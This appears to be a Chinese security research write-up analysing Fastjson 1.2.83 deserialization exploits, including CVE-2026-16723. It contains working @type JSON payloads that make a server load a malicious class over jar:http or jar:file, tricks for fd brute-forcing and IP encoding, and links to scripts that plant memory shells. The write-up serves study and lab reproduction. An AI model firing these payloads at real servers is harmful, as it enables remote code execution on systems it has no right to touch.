---
title: 1.2.83 利用技巧
description: Fastjson 1.2.83 写文件 + @JSONType；CVE-2026-16723（1.2.68–1.2.83）jar:http / jar:file 协议加载
order: 0
---

# 1.2.83 利用技巧

本文分析 Fastjson **1.2.83** 相关利用思路：配合写文件与 `@JSONType` 绕过白名单；以及 **CVE-2026-16723**（影响 **1.2.68–1.2.83**，不仅限于 1.2.83）通过 `jar:http` / `jar:file` 等协议加载恶意类。供安全研究与本地复现参考。

相关阅读：

- [≤1.2.68 利用技巧](/docs/fastjson-1.2.68)
- [≤1.2.80 利用技巧](/docs/fastjson-1.2.80)
- [≤1.2.47 利用技巧](/docs/fastjson-1.2.47)
- [写文件落地 RCE](/docs/writefile-rce)
- [写文件 + JSONType 组合漏洞](https://flowerwind.github.io/2025/02/28/%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%A1%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87/)
- [类名修改脚本](https://github.com/1diot9/MyJavaSecStudy/blob/main/fastjson/fastjson/fastj-1.2.83/classNameModefier.py)
- [fd 利用脚本](https://github.com/1diot9/MyJavaSecStudy/blob/main/fastjson/fastjson/fastj-1.2.83/cve-2026-16723/poc_fd_cache_writefile.py)
- [配套 Docker 靶场](https://github.com/1diot9/MyJavaSecStudy/tree/main/fastjson/fastjson/fastj-1.2.83/cve-2026-16723)

---

## 1. 写文件 + `@JSONType` 绕过

1.2.83 通过 `@type` 加载类时有白名单机制，但可通过 `@JSONType` 等注解绕过。

配合写文件漏洞（写 `tomcat-docbase`，或写 jar 到类加载路径），再用 `@type` 触发，仍有机会 getshell。落地手法见 [写文件落地 RCE](/docs/writefile-rce)；`@JSONType` 细节见上方相关文章。

---

## 2. CVE-2026-16723：`jar:http` / `jar:file` 加载

> **版本范围**：官方公告为 Fastjson **1.2.68–1.2.83**（已修复于 1.2.84），**不是**仅 1.2.83 可打。本文放在 1.2.83 文档下是因为本仓库证明靶场用 1.2.83；前置条件是 Spring Boot **fat-jar**（`LaunchedURLClassLoader`）+ 默认配置（AutoType 关、SafeMode 关），而非「必须探测到 1.2.83」。

### 2.1 根因

在特定运行环境下，特定 `ClassLoader` 能接受 `jar`、`http` 等协议，从远程或本地加载字节码，从而将带 `@JSONType` 注解的恶意类加载进 JVM，并在 Fastjson 反序列化时初始化。

### 2.2 测试 PoC

```json
{
  "@type": "jar:http:..localhost:9192.CalcJType!.CalcJType"
}
```

```json
{
  "@type": "http:..localhost:9192.CalcJType"
}
```

```json
{
  "@type": "jar:file:.D:.CalcJType!.CalcJType"
}
```

### 2.3 靶场与复现注意

测试靶场：[MyJavaSecStudy / fastj-1.2.83/target](https://github.com/1diot9/MyJavaSecStudy/tree/main/fastjson/fastjson/fastj-1.2.83/target)

| 环境 | 说明 |
|------|------|
| Spring Boot 内嵌 Tomcat | **无法**利用 `jar:http` |
| 内嵌 Undertow | **可以**利用 `jar:http` |

复现时必须通过 **jar 包形式启动**，不能直接在 IDEA 内运行；否则使用的类加载器不同，会导致复现失败。

---

## 3. `jar:http` 利用（Undertow）

### 3.1 协议转换

`checkAutoType` 中会对传入的 `typeName` 做替换，将点号全部替换为斜杠。

例如传入：

```text
jar:http:..localhost:9192.CalcJType!.CalcJType
```

替换后变为：

```text
jar:http://localhost:9192/CalcJType!/CalcJType.class
```

### 3.2 关键：`LaunchedURLClassLoader`

`defaultClassLoader` 默认为 `null`，因此 `ParserConfig.class.getClassLoader()` 拿到的类加载器直接决定能否加载 `jar:http` 指向的字节码。

在 fat jar 启动下，通常为：

```text
org.springframework.boot.loader.LaunchedURLClassLoader
```

该加载器继承 `URLClassLoader`，能够解析 `jar`、`http` 等协议。注意：这个类只有在打包成 fat jar 后才会出现，IDEA 里若要搜索/调试，需自行把 fat jar 加到库中。

### 3.3 `getResourceAsStream` 两次请求

跟进 `getResourceAsStream` 会请求两次远程资源：

1. `URL url = getResource(name);` —— 不开启缓存，获取输入流后立即关闭，效果为探活。
2. `InputStream is = urlc.getInputStream();` —— 再次获取输入流，且会默认进行缓存。

### 3.4 `@JSONType` 检查与缓存

回到 `checkAutoType` 后，Fastjson 用自写 asm 机制检查类上是否有 `@JSONType` 注解。有注解时会直接进入 `TypeUtils.loadClass`，效果等同开启 `autoTypeSupport`，且开启类缓存，可反复触发。

### 3.5 奇怪类名与 `defineClass`

`loadClass` 时拿到的 `className` 形如：

```text
jar:http:..localhost:9192.CalcJType!.CalcJType
```

这类名字在 IDE 里一般不允许直接命名，但 JVM 类名包容性很强，可通过脚本改类名后再打包。

类名修改脚本：[classNameModefier.py](https://github.com/1diot9/MyJavaSecStudy/blob/main/fastjson/fastjson/fastj-1.2.83/classNameModefier.py)

脚本会修改 `CalcJType` 的实际类名，并打包成无扩展名的 jar，用于触发漏洞。

加载流程要点：

1. 双亲委派向上委派到 bootstrap，父加载器都加载不到后，由子加载器 `findClass`（此处为 `java.net.URLClassLoader#findClass`）。
2. `findClass` 会把点号换成斜杠并拼接 `.class`，指向托管恶意 jar 的服务，取回字节码再 `defineClass`。
3. `defineClass` 里的 `name` 仍是奇怪的协议形式类名；JNI native 会把点号替换成斜杠，与 JVM 类名字符集规则一致。
4. 恶意类进入 JVM 后被 Fastjson 缓存，最终在类初始化路径上触发。

---

## 4. Tomcat 下为何 `jar:http` 失败

换成内嵌 Tomcat 时，关键差异是最终类加载器变为：

```text
TomcatEmbeddedWebappClassLoader
```

而不是 `LaunchedURLClassLoader`。

在 `TomcatEmbeddedWebappClassLoader#loadFromParent` 中，传入的 parent loader 其实仍是 `LaunchedURLClassLoader`，理论上能加载 `jar:http` 资源；但继续跟进会在 `forName0` 这个 native 层报错。

原因：`forName0` **不支持类名中出现双斜杠**，而 `http://` 中含双斜杠，导致加载失败。

相关 native 调用链（JDK 8）：

```text
Java_java_lang_Class_forName0
  → VerifyClassname
  → skip_over_fieldname
```

参考：[openjdk Class.c (jdk8-b120)](https://github.com/openjdk/jdk/blob/jdk8-b120/jdk/src/share/native/java/lang/Class.c)

对比：

| 中间件 | 加载路径 | `jar:http`（含 `//`） |
|--------|----------|------------------------|
| Undertow | 双亲委派 → `URLClassLoader#findClass` | 通常可利用（JDK 依赖见下） |
| 内嵌 Tomcat | `forName0` 校验类名 | 失败（双斜杠） |

另外，在 **JDK 11 及以上**，`URLClassLoader#findClass` 也往往加载不了：最终依赖 `defineClass` 的 native 方法，高版本同样不允许类名中出现连续斜杠。调用链大致为：

```text
Java_java_lang_ClassLoader_defineClass1
  → JVM_DefineClassWithSource
  → jvm_define_class_common
  → SystemDictionary::resolve_from_stream
  → KlassFactory::create_from_stream
  → ClassFileParser
  → parse_stream → parse_constant_pool
  → verify_legal_class_name → verify_unqualified_name
```

参考：[classFileParser.cpp (jdk-11+28)](https://raw.githubusercontent.com/openjdk/jdk/refs/tags/jdk-11%2B28/src/hotspot/share/classfile/classFileParser.cpp)

---

## 5. `jar:file` 利用

Payload：

```json
{
  "@type": "jar:file:.D:.CalcJType!.CalcJType"
}
```

点号转换后 **不出现连续斜杠**，因此无论 Tomcat 还是 Undertow 通常都能走通。缺点是要结合文件上传或文件缓存机制。分析过程与 `jar:http` 类似，只是 `LaunchedURLClassLoader` / `URLClassLoader` 最终解析的协议不同。

### 5.1 `/proc/self/fd` 缓存思路

文件缓存机制一般利用 `/proc/self/fd/x`：

1. 先通过 `jar:http` 缓存 jar（jar 中包含多个预设好的 class）。
2. 再通过 `jar:file:.proc.self.fd.x!.CalcJType` 爆破 fd 去触发。

---

## 6. 其他协议

### 6.1 `http:` 利用

利用步骤与 `jar:http` 几乎一致，先修改类名。主要差异在 `getResourceAsStream`：拿到的是 `HttpURLConnection`，没有缓存操作，直接返回。后续 `loadClass` 仍取决于类加载器。

### 6.2 `file:` 利用

```json
{
  "@type": "file:.D:.CalcJType"
}
```

---

## 7. IP 转换问题

`URLClassLoader` 加载时会把点号替换成斜杠再查找资源。对 `localhost` 没问题；若写成 `127.0.0.1` 这类 IP，地址会被破坏。

可采用进制转换（SSRF 绕过中常用）：

```text
# 10 进制
http://2130706433/  = http://127.0.0.1
http://3232235521/  = http://192.168.0.1
http://3232235777/  = http://192.168.1.1
```

---

## 8. 配套脚本与靶场

| 资源 | 说明 |
|------|------|
| [poc_fd_cache_writefile.py](https://github.com/1diot9/MyJavaSecStudy/blob/main/fastjson/fastjson/fastj-1.2.83/cve-2026-16723/poc_fd_cache_writefile.py) | 支持 `jar:http` 与 fd 爆破；支持回显马、内存马（内存马依赖 [MemShellParty](https://github.com/ReaJason/MemShellParty) Web 服务，需在脚本中指定 API） |
| [cve-2026-16723 Docker 靶场](https://github.com/1diot9/MyJavaSecStudy/tree/main/fastjson/fastjson/fastj-1.2.83/cve-2026-16723) | 配套复现环境 |
| [classNameModefier.py](https://github.com/1diot9/MyJavaSecStudy/blob/main/fastjson/fastjson/fastj-1.2.83/classNameModefier.py) | 修改恶意类真实类名并打包 |

---

## 小结

| 点 | 结论 |
|----|------|
| `@JSONType` | 可绕过 1.2.83 `@type` 白名单；配合写文件仍可能 getshell |
| CVE-2026-16723 | **1.2.68–1.2.83**；约束在 fat-jar ClassLoader（`LaunchedURLClassLoader`），非「仅 1.2.83」 |
| `jar:http` | Undertow 更易成功；内嵌 Tomcat 常因 `forName0` 拒绝双斜杠失败；JDK 11+ `defineClass` 也更严 |
| `jar:file` | 无连续斜杠，Tomcat / Undertow 均可尝试；需结合上传或 fd 缓存 |
| 复现 | 必须用 jar 启动，勿直接在 IDEA 跑 |
